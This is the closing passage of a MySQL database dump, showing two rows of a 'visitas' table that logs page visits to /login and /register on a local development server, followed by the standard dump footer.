(312,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 17:16:00'),
(313,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 17:16:02');
/*!40000 ALTER TABLE `visitas` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-07-31 11:21:11
